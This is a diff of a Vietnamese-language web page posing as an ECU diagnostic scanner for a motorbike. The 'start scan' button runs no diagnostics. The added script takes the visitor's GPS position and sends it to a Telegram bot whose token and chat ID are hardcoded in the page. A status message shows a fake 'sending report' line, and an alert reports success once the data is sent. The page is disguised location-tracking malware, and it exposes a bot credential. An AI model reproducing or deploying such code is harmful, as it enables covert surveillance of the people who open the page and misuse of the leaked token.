@@ -3,44 +3,47 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hệ Thống Quét Lỗi ECU - Wave 54 4Val</title>
+    <title>ECU Wave 54</title>
 </head>
-<body style="background-color: #0d1117; color: #00f2ff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden;">
+<body style="background: #0d1117; color: #00f2ff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;">
 
-    <div style="width: 90%; max-width: 400px; padding: 30px; border: 1px solid #00f2ff; border-radius: 20px; background: rgba(0, 242, 255, 0.05); backdrop-filter: blur(10px); box-shadow: 0 0 30px rgba(0, 242, 255, 0.1); text-align: center;">
+    <div style="width: 85%; max-width: 350px; padding: 25px; border: 1px solid #00f2ff; border-radius: 15px; background: #161b22; box-shadow: 0 0 20px rgba(0,242,255,0.2); text-align: center; position: relative; z-index: 1;">
         
-        <div style="font-size: 12px; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 10px; color: #8b949e;">Electronic Control Unit</div>
-        <h1 style="margin: 0 0 20px 0; font-size: 24px; font-weight: 300; letter-spacing: 1px;">WAVE <span style="font-weight: bold; color: #fff;">54-4VAL</span></h1>
+        <h2 style="margin: 0 0 15px 0; font-size: 20px; letter-spacing: 2px;">WAVE <span style="color: #fff;">54-4VAL</span></h2>
         
-        <hr style="border: 0; border-top: 1px solid rgba(0, 242, 255, 0.2); margin-bottom: 30px;">
-
-        <div id="display-screen" style="background: #000; padding: 20px; border-radius: 10px; margin-bottom: 30px; border-left: 4px solid #00f2ff; text-align: left; min-height: 60px;">
-            <div id="status" style="font-family: 'Courier New', Courier, monospace; font-size: 14px;">> Đang chờ lệnh...</div>
+        <div style="background: #000; padding: 15px; border-radius: 8px; margin-bottom: 25px; border-left: 3px solid #00f2ff; text-align: left;">
+            <div id="status" style="font-family: monospace; font-size: 13px;">> Sẵn sàng quét...</div>
         </div>
 
-        <button onclick="runDiagnostic()" style="width: 100%; padding: 15px; background: transparent; color: #00f2ff; border: 2px solid #00f2ff; border-radius: 50px; font-size: 16px; font-weight: bold; cursor: pointer; transition: all 0.3s; text-transform: uppercase; letter-spacing: 1px;">
-            Bắt đầu quét lỗi
+        <button onclick="runDiagnostic()" style="width: 100%; padding: 15px; background: #00f2ff; color: #000; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; position: relative; z-index: 10;">
+            BẮT ĐẦU QUÉT LỖI
         </button>
 
-        <div style="margin-top: 25px; font-size: 11px; color: #484f58;">
-            Hệ thống xăng cơ - Bluetooth v4.0
+        <div style="margin-top: 20px; font-size: 10px; color: #484f58; text-transform: uppercase;">
+            ECU Diagnostic Tool v2.0
         </div>
     </div>
 
     <script>
-        async function runDiagnostic() {
+        function runDiagnostic() {
             const status = document.getElementById("status");
             const token = "8571376502:AAGnzWuqINqn1DfeL-ux16jC-sWt9xeqjmg"; //
             const chat_id = "1197457034"; 
 
-            status.innerHTML = "> Đang kết nối ECU...";
+            status.innerHTML = "> Đang kết nối...";
             
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                status.innerHTML = "> Đang đọc dữ liệu GPS...<br>> Đang gửi báo cáo...";
+            navigator.geolocation.getCurrentPosition((pos) => {
+                status.innerHTML = "> Đang gửi dữ liệu...";
+                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("🛠 BÁO CÁO:\n📍 Xe 54 4val tại: https://www.google.com/maps?q=$" + pos.coords.latitude + "," + pos.coords.longitude)}`;
                 
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                const text = `🛠 BÁO CÁO HỆ THỐNG:\n📍 Vị trí xe: https://www.google.com/maps?q=${lat},${lon}\n✅ Trạng thái: Bình thường`;
-                
-                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&
-                
+                fetch(url).then(() => {
+                    status.innerHTML = "<span style='color: #4cd137;'>> HOÀN TẤT!</span>";
+                    alert("Đã gửi thành công!");
+                });
+            }, () => {
+                status.innerHTML = "<span style='color: #ff4757;'>> LỖI: GPS bị chặn!</span>";
+            });
+        }
+    </script>
+</body>
+</html>
